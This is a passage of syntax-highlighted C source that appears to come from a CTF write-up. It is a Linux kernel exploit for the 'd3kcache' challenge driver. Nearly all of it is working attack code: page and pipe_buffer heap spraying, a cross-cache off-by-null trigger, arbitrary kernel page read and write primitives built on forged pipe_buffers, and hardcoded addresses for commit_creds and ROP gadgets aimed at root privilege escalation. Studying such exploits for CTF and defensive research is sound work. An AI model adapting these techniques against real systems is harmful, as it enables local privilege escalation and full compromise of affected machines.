class="title">option</span> *<span class="title">option</span> =</span> <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct option));</span><br><span class="line">    option-&gt;idx = idx;</span><br><span class="line">    option-&gt;size = size;</span><br><span class="line">    option-&gt;buf = buf;</span><br><span class="line">    ioctl(fd, <span class="number">0x114</span>, option);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">option</span> *<span class="title">option</span> =</span> <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct option));</span><br><span class="line">    option-&gt;idx = idx;</span><br><span class="line">    ioctl(fd, <span class="number">0x810</span>, option);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> idx, <span class="keyword">unsigned</span> <span class="keyword">int</span> size, <span class="keyword">char</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">option</span> *<span class="title">option</span> =</span> <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct option));</span><br><span class="line">    option-&gt;idx = idx;</span><br><span class="line">    option-&gt;size = size;</span><br><span class="line">    option-&gt;buf = buf;</span><br><span class="line">    ioctl(fd, <span class="number">0x1919</span>, option);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">edit</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> idx, <span class="keyword">unsigned</span> <span class="keyword">int</span> size, <span class="keyword">char</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">option</span> *<span class="title">option</span> =</span> <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct option));</span><br><span class="line">    option-&gt;idx = idx;</span><br><span class="line">    option-&gt;size = size;</span><br><span class="line">    option-&gt;buf = buf;</span><br><span class="line">    ioctl(fd, <span class="number">0x514</span>, option);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pgv_page_request</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> idx;</span><br><span class="line">    <span class="keyword">int</span> cmd;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> size;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> nr;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">tpacket_versions</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    TPACKET_V1,</span><br><span class="line">    TPACKET_V2,</span><br><span class="line">    TPACKET_V3,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tpacket_req</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> tp_block_size;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> tp_block_nr;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> tp_frame_size;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> tp_frame_nr;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> cmd_pipe_req[<span class="number">2</span>], cmd_pipe_reply[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">create_socket_and_alloc_pages</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> size, <span class="keyword">unsigned</span> <span class="keyword">int</span> nr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tpacket_req</span> <span class="title">req</span>;</span></span><br><span class="line">    <span class="keyword">int</span> socket_fd, version;</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">    socket_fd = socket(AF_PACKET, SOCK_RAW, PF_PACKET);</span><br><span class="line">    <span class="keyword">if</span> (socket_fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[x] failed at socket(AF_PACKET, SOCK_RAW, PF_PACKET)\n&quot;</span>);</span><br><span class="line">        ret = socket_fd;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    version = TPACKET_V1;</span><br><span class="line">    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_VERSION,</span><br><span class="line">                     &amp;version, <span class="keyword">sizeof</span>(version));</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[x] failed at setsockopt(PACKET_VERSION)\n&quot;</span>);</span><br><span class="line">        close(socket_fd);</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(&amp;req, <span class="number">0</span>, <span class="keyword">sizeof</span>(req));</span><br><span class="line">    req.tp_block_size = size;</span><br><span class="line">    req.tp_block_nr = nr;</span><br><span class="line">    req.tp_frame_size = <span class="number">0x1000</span>;</span><br><span class="line">    req.tp_frame_nr = (req.tp_block_size * req.tp_block_nr) / req.tp_frame_size;</span><br><span class="line"></span><br><span class="line">    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_TX_RING, &amp;req, <span class="keyword">sizeof</span>(req));</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[x] failed at setsockopt(PACKET_TX_RING)\n&quot;</span>);</span><br><span class="line">        close(socket_fd);</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> socket_fd;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">alloc_page</span><span class="params">(<span class="keyword">int</span> idx, <span class="keyword">unsigned</span> <span class="keyword">int</span> size, <span class="keyword">unsigned</span> <span class="keyword">int</span> nr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pgv_page_request</span> <span class="title">req</span> =</span> &#123;</span><br><span class="line">        .idx = idx,</span><br><span class="line">        .cmd = <span class="number">0</span>,</span><br><span class="line">        .size = size,</span><br><span class="line">        .nr = nr,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">    write(cmd_pipe_req[<span class="number">1</span>], &amp;req, <span class="keyword">sizeof</span>(struct pgv_page_request));</span><br><span class="line">    read(cmd_pipe_reply[<span class="number">0</span>], &amp;ret, <span class="keyword">sizeof</span>(ret));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">free_page</span><span class="params">(<span class="keyword">int</span> idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pgv_page_request</span> <span class="title">req</span> =</span> &#123;</span><br><span class="line">        .idx = idx,</span><br><span class="line">        .cmd = <span class="number">1</span>,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">    write(cmd_pipe_req[<span class="number">1</span>], &amp;req, <span class="keyword">sizeof</span>(req));</span><br><span class="line">    read(cmd_pipe_reply[<span class="number">0</span>], &amp;ret, <span class="keyword">sizeof</span>(ret));</span><br><span class="line"></span><br><span class="line">    usleep(<span class="number">10000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> offset, len;</span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> flags;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">private</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> pipe_fd[PIPE_SPRAY_NUM][<span class="number">2</span>];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> <span class="title">evil_2nd_buf</span>, <span class="title">evil_3rd_buf</span>, <span class="title">evil_4th_buf</span>;</span></span><br><span class="line"><span class="keyword">int</span> self_4th_pipe_pid = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">int</span> self_2nd_pipe_pid = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">int</span> self_3rd_pipe_pid = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">char</span> temp_zero_buf[<span class="number">0x1000</span>] = &#123;<span class="string">&#x27;\0&#x27;</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">arbitrary_read_by_pipe</span><span class="params">(struct page *page_to_read, <span class="keyword">void</span> *dst)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    evil_2nd_buf.offset = <span class="number">0</span>;</span><br><span class="line">    evil_2nd_buf.len = <span class="number">0x1ff8</span>;</span><br><span class="line">    evil_2nd_buf.page = page_to_read;</span><br><span class="line"></span><br><span class="line">    write(pipe_fd[self_3rd_pipe_pid][<span class="number">1</span>], &amp;evil_4th_buf, <span class="keyword">sizeof</span>(evil_4th_buf));</span><br><span class="line"></span><br><span class="line">    write(pipe_fd[self_4th_pipe_pid][<span class="number">1</span>], &amp;evil_2nd_buf, <span class="keyword">sizeof</span>(evil_2nd_buf));</span><br><span class="line">    write(pipe_fd[self_4th_pipe_pid][<span class="number">1</span>],</span><br><span class="line">          temp_zero_buf,</span><br><span class="line">          TRD_PIPE_BUF_SZ - <span class="keyword">sizeof</span>(evil_2nd_buf));</span><br><span class="line"></span><br><span class="line">    write(pipe_fd[self_4th_pipe_pid][<span class="number">1</span>], &amp;evil_3rd_buf, <span class="keyword">sizeof</span>(evil_3rd_buf));</span><br><span class="line"></span><br><span class="line">    read(pipe_fd[self_2nd_pipe_pid][<span class="number">0</span>], dst, <span class="number">0xfff</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">arbitrary_write_by_pipe</span><span class="params">(struct page *page_to_write, <span class="keyword">void</span> *src, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    evil_2nd_buf.page = page_to_write;</span><br><span class="line">    evil_2nd_buf.offset = <span class="number">0</span>;</span><br><span class="line">    evil_2nd_buf.len = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    write(pipe_fd[self_3rd_pipe_pid][<span class="number">1</span>], &amp;evil_4th_buf, <span class="keyword">sizeof</span>(evil_4th_buf));</span><br><span class="line"></span><br><span class="line">    write(pipe_fd[self_4th_pipe_pid][<span class="number">1</span>], &amp;evil_2nd_buf, <span class="keyword">sizeof</span>(evil_2nd_buf));</span><br><span class="line">    write(pipe_fd[self_4th_pipe_pid][<span class="number">1</span>],</span><br><span class="line">          temp_zero_buf,</span><br><span class="line">          TRD_PIPE_BUF_SZ - <span class="keyword">sizeof</span>(evil_2nd_buf));</span><br><span class="line"></span><br><span class="line">    write(pipe_fd[self_4th_pipe_pid][<span class="number">1</span>], &amp;evil_3rd_buf, <span class="keyword">sizeof</span>(evil_3rd_buf));</span><br><span class="line"></span><br><span class="line">    write(pipe_fd[self_2nd_pipe_pid][<span class="number">1</span>], src, len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> page_offset_base;</span><br><span class="line"><span class="keyword">uint64_t</span> vmemmap_base;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">direct_map_addr_to_page_addr</span><span class="params">(<span class="keyword">size_t</span> direct_map_addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> page_count;</span><br><span class="line"></span><br><span class="line">    page_count = ((direct_map_addr &amp; (~<span class="number">0xfff</span>)) - page_offset_base) / <span class="number">0x1000</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> vmemmap_base + page_count * <span class="number">0x40</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> COMMIT_CREDS 0xffffffff811284e0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff82201a90</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> INIT_CRED 0xffffffff83079ee8</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> POP_RDI_RET 0xffffffff810157a9</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RET 0xffffffff810157aa</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PTE_OFFSET 12</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PMD_OFFSET 21</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PUD_OFFSET 30</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PGD_OFFSET 39</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PT_ENTRY_MASK 0b111111111UL</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PTE_MASK (PT_ENTRY_MASK &lt;&lt; PTE_OFFSET)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PMD_MASK (PT_ENTRY_MASK &lt;&lt; PMD_OFFSET)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PUD_MASK (PT_ENTRY_MASK &lt;&lt; PUD_OFFSET)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PGD_MASK (PT_ENTRY_MASK &lt;&lt; PGD_OFFSET)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PTE_ENTRY(addr) ((addr &gt;&gt; PTE_OFFSET) &amp; PT_ENTRY_MASK)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PMD_ENTRY(addr) ((addr &gt;&gt; PMD_OFFSET) &amp; PT_ENTRY_MASK)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PUD_ENTRY(addr) ((addr &gt;&gt; PUD_OFFSET) &amp; PT_ENTRY_MASK)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PGD_ENTRY(addr) ((addr &gt;&gt; PGD_OFFSET) &amp; PT_ENTRY_MASK)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// #define PAGE_ATTR_RW (1UL &lt;&lt; 1)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_ATTR_NX (1UL &lt;&lt; 63)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NS_CAPABLE_SETID 0xffffffff810fd2a0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    save_status();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *buf = <span class="built_in">malloc</span>(<span class="number">0x2000</span>);</span><br><span class="line">    <span class="keyword">char</span> target[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">size_t</span> target_addr;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">strcpy</span>(target, <span class="string">&quot;trytofind196082&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (prctl(PR_SET_NAME, target, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>) != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        errExit(<span class="string">&quot;cannot set name&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fd = open(<span class="string">&quot;/dev/d3kcache&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (fd == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        errExit(<span class="string">&quot;[-] faild open d3kcache!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    pipe(cmd_pipe_req);</span><br><span class="line">    pipe(cmd_pipe_reply);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!fork())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pgv_page_request</span> <span class="title">req</span>;</span></span><br><span class="line">        <span class="keyword">int</span> socket_fd[PGV_PAGE_NUM];</span><br><span class="line">        <span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">char</span> edit[<span class="number">0x100</span>];</span><br><span class="line">        <span class="keyword">int</span> tmp_fd;</span><br><span class="line"></span><br><span class="line">        unshare(CLONE_NEWNS | CLONE_NEWUSER | CLONE_NEWNET);</span><br><span class="line"></span><br><span class="line">        tmp_fd = open(<span class="string">&quot;/proc/self/setgroups&quot;</span>, O_WRONLY);</span><br><span class="line">        write(tmp_fd, <span class="string">&quot;deny&quot;</span>, <span class="built_in">strlen</span>(<span class="string">&quot;deny&quot;</span>));</span><br><span class="line">        close(tmp_fd);</span><br><span class="line"></span><br><span class="line">        tmp_fd = open(<span class="string">&quot;/proc/self/uid_map&quot;</span>, O_WRONLY);</span><br><span class="line">        <span class="built_in">snprintf</span>(edit, <span class="keyword">sizeof</span>(edit), <span class="string">&quot;0 %d 1&quot;</span>, getuid());</span><br><span class="line">        write(tmp_fd, edit, <span class="built_in">strlen</span>(edit));</span><br><span class="line">        close(tmp_fd);</span><br><span class="line"></span><br><span class="line">        tmp_fd = open(<span class="string">&quot;/proc/self/gid_map&quot;</span>, O_WRONLY);</span><br><span class="line">        <span class="built_in">snprintf</span>(edit, <span class="keyword">sizeof</span>(edit), <span class="string">&quot;0 %d 1&quot;</span>, getgid());</span><br><span class="line">        write(tmp_fd, edit, <span class="built_in">strlen</span>(edit));</span><br><span class="line">        close(tmp_fd);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            read(cmd_pipe_req[<span class="number">0</span>], &amp;req, <span class="keyword">sizeof</span>(req));</span><br><span class="line">            <span class="keyword">if</span> (req.cmd == <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                ret = create_socket_and_alloc_pages(req.size, req.nr);</span><br><span class="line">                socket_fd[req.idx] = ret;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (req.cmd == <span class="number">1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                ret = close(socket_fd[req.idx]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (req.cmd == <span class="number">2</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            write(cmd_pipe_reply[<span class="number">1</span>], &amp;ret, <span class="keyword">sizeof</span>(ret));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> pgv_1page_start_idx = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> pgv_4pages_start_idx = PGV_4PAGES_START_IDX;</span><br><span class="line">    <span class="keyword">int</span> pgv_8pages_start_idx = PGV_8PAGES_START_IDX;</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] spray pgv order-0 pages...&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PGV_1PAGE_SPRAY_NUM; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (alloc_page(i, <span class="number">0x1000</span>, <span class="number">1</span>) &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to create %d socket for pages spraying!\n&quot;</span>, i);</span><br><span class="line">                errExit(<span class="string">&quot;Faild to spray pgv!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] spray pgv order-2 pages...&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PGV_4PAGES_SPRAY_NUM; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (alloc_page(PGV_4PAGES_START_IDX + i, <span class="number">0x1000</span> * <span class="number">4</span>, <span class="number">1</span>) &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to create %d socket for pages spraying!\n&quot;</span>, i);</span><br><span class="line">                errExit(<span class="string">&quot;Faild to spray pgv!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] spray pgv order-3 pages...&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PGV_8PAGES_SPRAY_NUM; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (i % <span class="number">19</span> == <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                free_page(pgv_4pages_start_idx++);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (i % <span class="number">21</span> == <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                free_page(pgv_1page_start_idx += <span class="number">2</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (i % <span class="number">512</span> == <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                free_page(pgv_1page_start_idx += <span class="number">2</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (alloc_page(PGV_8PAGES_START_IDX + i, <span class="number">0x1000</span> * <span class="number">8</span>, <span class="number">1</span>) &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to create %d socket for pages spraying!\n&quot;</span>, i);</span><br><span class="line">                errExit(<span class="string">&quot;Faild to spray pgv!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> victim_pid = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">int</span> orig_pid = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] spray pipe_buffer...&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i++)</span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (pipe(pipe_fd[i]) &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to alloc %d pipe!&quot;</span>, i);</span><br><span class="line">                errExit(<span class="string">&quot;FAILED to create pipe!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] exetend pipe_buffer...&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; (PIPE_SPRAY_NUM / <span class="number">2</span>); i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (i % <span class="number">8</span> == <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                free_page(pgv_8pages_start_idx++);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (fcntl(pipe_fd[<span class="number">0</span> + i][<span class="number">1</span>], F_SETPIPE_SZ, <span class="number">0x1000</span> * <span class="number">64</span>) &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to extend %d pipe!\n&quot;</span>, <span class="number">0</span> + i);</span><br><span class="line">                errExit(<span class="string">&quot;FAILED to extend pipe!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] spray vulnerable 2k obj...&quot;</span>);</span><br><span class="line">        free_page(pgv_8pages_start_idx++);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            create(i, <span class="number">8</span>, <span class="string">&quot;0x196082&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] exetend pipe_buffer...&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; (PIPE_SPRAY_NUM / <span class="number">2</span>); i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (i % <span class="number">8</span> == <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                free_page(pgv_8pages_start_idx++);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (fcntl(pipe_fd[(PIPE_SPRAY_NUM / <span class="number">2</span>) + i][<span class="number">1</span>], F_SETPIPE_SZ, <span class="number">0x1000</span> * <span class="number">64</span>) &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to extend %d pipe!\n&quot;</span>, (PIPE_SPRAY_NUM / <span class="number">2</span>) + i);</span><br><span class="line">                errExit(<span class="string">&quot;FAILED to extend pipe!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] allocating pipe pages...&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;0x196082&quot;</span>, <span class="number">8</span>);</span><br><span class="line">            write(pipe_fd[i][<span class="number">1</span>], &amp;i, <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">            write(pipe_fd[i][<span class="number">1</span>], &amp;i, <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">            write(pipe_fd[i][<span class="number">1</span>], &amp;i, <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">            write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;0x196082&quot;</span>, <span class="number">8</span>);</span><br><span class="line">            write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;0x196082&quot;</span>, <span class="number">8</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] trigerring cross-cache off-by-null...&quot;</span>);</span><br><span class="line">        show(<span class="number">0</span>, <span class="number">0</span>, buf);</span><br><span class="line">        <span class="built_in">memset</span>(buf, <span class="number">0x61</span>, <span class="number">0x800</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            edit(i, <span class="number">0x7f8</span>, buf);</span><br><span class="line">        &#125;</span><br><span class="line">        show(<span class="number">0</span>, <span class="number">0</span>, buf);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] checking for corruption...&quot;</span>);</span><br><span 